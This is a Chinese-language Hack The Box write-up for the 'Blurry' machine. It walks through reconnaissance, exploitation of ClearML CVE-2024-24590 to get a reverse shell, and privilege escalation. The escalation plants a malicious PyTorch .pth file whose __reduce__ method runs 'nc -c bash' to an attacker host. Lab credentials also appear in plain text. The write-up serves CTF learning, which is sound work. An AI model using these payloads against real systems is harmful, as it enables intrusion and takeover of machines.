---
layout: post
title: HTB——Blurry
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Blurry/01.png?raw=true)

# 0x01 信息收集

```bash
 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.6  Expired: 2026.01.01
[12:56:06] [INFO] Start IpScan:10.129.137.60
[12:56:06] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[12:56:06] [+] 10.129.137.60:22 open                         
[12:56:06] [+] 10.129.137.60:80 open
[12:56:07] [+] [TCP/SSH]  [OpenSSH 8.4p1 Debian 5+deb11u3] 10.129.137.60:22 [SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3]                                                                              
[12:56:07] [INFO] start SSH check 10.129.137.60:22           
[12:56:07] [+] 开始 SshScan 任务: SSH://10.129.137.60:22     
[12:56:07] [+] [TCP/HTTP] [200] [nginx/1.18.0] http://10.129.137.60:80 [ClearML]
                                                             
[12:56:16] [+] alive ports is: 2
[12:56:16] [+] Ip扫描结束:10.129.137.60
[12:56:16] [INFO] Start UrlScan:http://10.129.137.60:80
[12:56:16] [+] [TCP/HTTP] [200] [nginx/1.18.0] http://10.129.137.60:80 [ClearML]
                                                 
[12:56:17] [+] Url扫描结束:http://10.129.137.60:80
[12:56:17] [+] 项目任务完成:Default, Timeuse：11.102233341
[12:56:17] [+] 扫描结束,耗时: 11.344264156s

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://app.blurry.htb
 :: Wordlist         : FUZZ: /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-20000.txt
 :: Header           : Host: FUZZ.blurry.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 5
________________________________________________

files                   [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 117ms]
app                     [Status: 200, Size: 13327, Words: 382, Lines: 29, Duration: 91ms]
chat                    [Status: 200, Size: 218733, Words: 12692, Lines: 449, Duration: 105ms]
api                     [Status: 200, Size: 13327, Words: 382, Lines: 29, Duration: 91ms]
:: Progress: [20000/20000] :: Job [1/1] :: 402 req/sec :: Duration: [0:00:53] :: Errors: 0 ::

```

扫描后我们访问80端口服务。是一个clearML服务。还有三个子域名。其中chat接口搭建的是`rocketchat`服务。我们统计所有`generall`频道的用户名称，并到`app`子域名一个个尝试登陆。

```bash
Dio Ptrie   Iris Pupil   Chad Jippity   Lena Tick   car melo   Ray Flection
```

---

# 0x02 CVE-2024-24590复现

尝试发现`Chad Jippity`可直接登陆上ClearML，且在`settings`内我们可以看到其版本号为`1.13.1-426`.我们需要下载`CVE-2024-24590`的EXP并在本地安装clearML服务并开启监听。

```bash
pip3 install clearML
┌──(root㉿kali)-[/home/kali/HTB/Blurry]
└─# clearml-init
ClearML SDK setup process

Please create new clearml credentials through the settings page in your `clearml-server` web app (e.g. http://localhost:8080//settings/workspace-configuration) 
Or create a free account at https://app.clear.ml/settings/workspace-configuration

In settings page, press "Create new credentials", then press "Copy to clipboard".

Paste copied configuration here:
api { 
    web_server: http://app.blurry.htb
    api_server: http://api.blurry.htb
    files_server: http://files.blurry.htb
    credentials {
        "access_key" = "Y6EAACP6S5MHDBMTB09Z"
        "secret_key"  = "SfDIzfRsSxztD7OappXRNQzfTArHhnDVaUaOIaE7eMkfGEqVYN"
    }
}
Detected credentials key="Y6EAACP6S5MHDBMTB09Z" secret="SfDI***"

ClearML Hosts configuration:
Web App: http://app.blurry.htb
API: http://api.blurry.htb
File Store: http://files.blurry.htb

Verifying credentials ...
Credentials verified!

New configuration stored in /root/clearml.conf
ClearML setup completed successfully.
```

请注意我们的hosts文件必须提前配置好IP指向，不然在此处会有解析问题。在配置完后，我们在本机监听指定端口，并使用脚本输入特定参数进行攻击。至于参数的指定请参考`chat.blurry.htb`内的`Announcement`频道内。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Blurry/ClearML-CVE-2024-24590-main]
└─# python3 exploit.py --project_name  "Black Swan" --task_name "test" --artifact_name "test" --tags "review" --ip "10.10.16.8" --port "54311"
[+] Initializing command with IP: 10.10.16.8 and Port: 54311
[+] Initializing ClearML task with project name: Black Swan, task name: test, tags: ['review']
ClearML Task: created new task id=0b984da579aa481c8f458042f4d23add
2025-04-08 13:44:59,698 - clearml.Task - INFO - No repository found, storing script code instead
ClearML results page: http://app.blurry.htb/projects/116c40b9b53743689239b6b460efd7be/experiments/0b984da579aa481c8f458042f4d23add/output/log
CLEARML-SERVER new package available: UPGRADE to v2.0.0 is recommended!
Release Notes:
### Breaking Changes

MongoDB major version was upgraded from v5.x to 6.x.
Please note that if your current ClearML Server version is smaller than v1.17 (where MongoDB v5.x was first used), you'll need to first upgrade to ClearML Server v1.17.
#### Upgrading to ClearML Server v1.17 from a previous version
- If using docker-compose,  use the following docker-compose files:
  * [docker-compose file](https://github.com/allegroai/clearml-server/blob/2976ce69cc91550a3614996e8a8d8cd799af2efd/upgrade/1_17_to_2_0/docker-compose.yml)
  * [docker-compose file foe Windows](https://github.com/allegroai/clearml-server/blob/2976ce69cc91550a3614996e8a8d8cd799af2efd/upgrade/1_17_to_2_0/docker-compose-win10.yml)

### New Features

- New look and feel: Full light/dark themes ([clearml #1297](https://github.com/allegroai/clearml/issues/1297))
- New UI task creation options
  - Support bash as well as python scripts
  - Support file upload
- New UI setting for configuring cloud storage credentials with which ClearML can clean up cloud storage artifacts on task deletion. 
- Add UI scalar plots presentation of plots in sections grouped by metrics.
- Add UI Batch export plot embed codes for all metric plots in a single click.
- Add UI pipeline presentation of steps grouped into stages

### Bug Fixes
- Fix UI Model Endpoint's Number of Requests plot sometimes displays incorrect data
- Fix UI datasets page does not filter according to project when dataset is running 
- Fix UI task scalar legend does not change colors when smoothing is enabled 
- Fix queue list in UI Workers and Queues page does not alphabetically sort by queue display name 
- Fix queue display name is not searchable in UI Task Creation modal's queue field

[+] Uploading artifact with name: test
[+] Artifact uploaded successfully
ClearML Monitor: GPU monitoring failed getting GPU reading, switching off GPU monitoring


┌──(root㉿kali)-[/home/kali]
└─# rlwrap -cAr nc -lvnp 54311
listening on [any] 54311 ...
```

稍事等待几分钟，我们就能收到来自`Jippity`的shell了。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Blurry/02.png?raw=true)

根据HTB提示，我们查找当前用户可以运行的特权文件。

```bash
jippity@blurry:~$ sudo -l
Matching Defaults entries for jippity on blurry:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jippity may run the following commands on blurry:
    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
```

发现我们可以跑的有`evaluate_model`与`models`文件夹下的后缀pth文件。

```bash
jippity@blurry:~$ cat /usr/bin/evaluate_model
#!/bin/bash
# Evaluate a given model against our proprietary dataset.
# Security checks against model file included.

if [ "$#" -ne 1 ]; then
    /usr/bin/echo "Usage: $0 <path_to_model.pth>"
    exit 1
fi

MODEL_FILE="$1"
TEMP_DIR="/opt/temp"
PYTHON_SCRIPT="/models/evaluate_model.py"  

/usr/bin/mkdir -p "$TEMP_DIR"

file_type=$(/usr/bin/file --brief "$MODEL_FILE")

# Extract based on file type
if [[ "$file_type" == *"POSIX tar archive"* ]]; then
    # POSIX tar archive (older PyTorch format)
    /usr/bin/tar -xf "$MODEL_FILE" -C "$TEMP_DIR"
elif [[ "$file_type" == *"Zip archive data"* ]]; then
    # Zip archive (newer PyTorch format)
    /usr/bin/unzip -q "$MODEL_FILE" -d "$TEMP_DIR"
else
    /usr/bin/echo "[!] Unknown or unsupported file format for $MODEL_FILE"
    exit 2
fi

/usr/bin/find "$TEMP_DIR" -type f \( -name "*.pkl" -o -name "pickle" \) -print0 | while IFS= read -r -d $'\0' extracted_pkl; do
    fickling_output=$(/usr/local/bin/fickling -s --json-output /dev/fd/1 "$extracted_pkl")

    if /usr/bin/echo "$fickling_output" | /usr/bin/jq -e 'select(.severity == "OVERTLY_MALICIOUS")' >/dev/null; then
        /usr/bin/echo "[!] Model $MODEL_FILE contains OVERTLY_MALICIOUS components and will be deleted."
        /bin/rm "$MODEL_FILE"
        break
    fi
done

/usr/bin/find "$TEMP_DIR" -type f -exec /bin/rm {} +
/bin/rm -rf "$TEMP_DIR"

if [ -f "$MODEL_FILE" ]; then
    /usr/bin/echo "[+] Model $MODEL_FILE is considered safe. Processing..."
    /usr/bin/python3 "$PYTHON_SCRIPT" "$MODEL_FILE"
fi
```

调用`/models/evaluate_model.py`文件，我们跟进此python文件继续分析

```bash
import torch
import torch.nn as nn
from torchvision import transforms
from torchvision.datasets import CIFAR10
from torch.utils.data import DataLoader, Subset
import numpy as np
import sys


class CustomCNN(nn.Module):
    def __init__(self):
        super(CustomCNN, self).__init__()
        self.conv1 = nn.Conv2d(in_channels=3, out_channels=16, kernel_size=3, padding=1)
        self.conv2 = nn.Conv2d(in_channels=16, out_channels=32, kernel_size=3, padding=1)
        self.pool = nn.MaxPool2d(kernel_size=2, stride=2, padding=0)
        self.fc1 = nn.Linear(in_features=32 * 8 * 8, out_features=128)
        self.fc2 = nn.Linear(in_features=128, out_features=10)
        self.relu = nn.ReLU()

    def forward(self, x):
        x = self.pool(self.relu(self.conv1(x)))
        x = self.pool(self.relu(self.conv2(x)))
        x = x.view(-1, 32 * 8 * 8)
        x = self.relu(self.fc1(x))
        x = self.fc2(x)
        return x


def load_model(model_path):
    model = CustomCNN()
    
    state_dict = torch.load(model_path)
    model.load_state_dict(state_dict)
    
    model.eval()  
    return model

def prepare_dataloader(batch_size=32):
    transform = transforms.Compose([
        transforms.RandomHorizontalFlip(),
        transforms.RandomCrop(32, padding=4),
        transforms.ToTensor(),
        transforms.Normalize(mean=[0.4914, 0.4822, 0.4465], std=[0.2023, 0.1994, 0.2010]),
    ])
    
    dataset = CIFAR10(root='/root/datasets/', train=False, download=False, transform=transform)
    subset = Subset(dataset, indices=np.random.choice(len(dataset), 64, replace=False))
    dataloader = DataLoader(subset, batch_size=batch_size, shuffle=False)
    return dataloader

def evaluate_model(model, dataloader):
    correct = 0
    total = 0
    with torch.no_grad():  
        for images, labels in dataloader:
            outputs = model(images)
            _, predicted = torch.max(outputs.data, 1)
            total += labels.size(0)
            correct += (predicted == labels).sum().item()
    
    accuracy = 100 * correct / total
    print(f'[+] Accuracy of the model on the test dataset: {accuracy:.2f}%')

def main(model_path):
    model = load_model(model_path)
    print("[+] Loaded Model.")
    dataloader = prepare_dataloader()
    print("[+] Dataloader ready. Evaluating model...")
    evaluate_model(model, dataloader)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python script.py <path_to_model.pth>")
    else:
        model_path = sys.argv[1]  # Path to the .pth file
        main(model_path)
```

接下来的打法涉及到AI，不是很会了所以参考人家的WP，大致思想就是借助魔术方法在pth文件内写入反弹shell语句，以此达到我们拿root shell的目的

```bash
import torch
import torch.nn as nn
import torch.nn.functional as F
import os

class Net(nn.Module):
    def __init__(self):
        super(Net, self).__init__()
        self.layer1 = nn.Linear(1, 128)
        self.layer2 = nn.Linear(128, 128)
        self.layer3 = nn.Linear(128, 2)

    def forward(self, x):
        x = F.relu(self.layer1(x))
        x = F.relu(self.layer2(x))
        action = self.layer3(x)
        return action

    def __reduce__(self):
        return (os.system, ('nc -c bash 10.10.xx.xx xxxxx',))

if __name__ == '__main__':
    n = Net()
    torch.save(n, 'getshell.pth')
```

考虑到环境复杂性，建议直接在靶机上生成后传参给脚本运行。

```bash
jippity@blurry:/tmp$ cp getshell.pth /models/getshell.pth
jippity@blurry:/tmp$ sudo /usr/bin/evaluate_model /models/getshell.pth
[+] Model /models/getshell.pth is considered safe. Processing...
```

最后我们就可以如愿收到`root`用户的shell了。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Blurry/03.png?raw=true)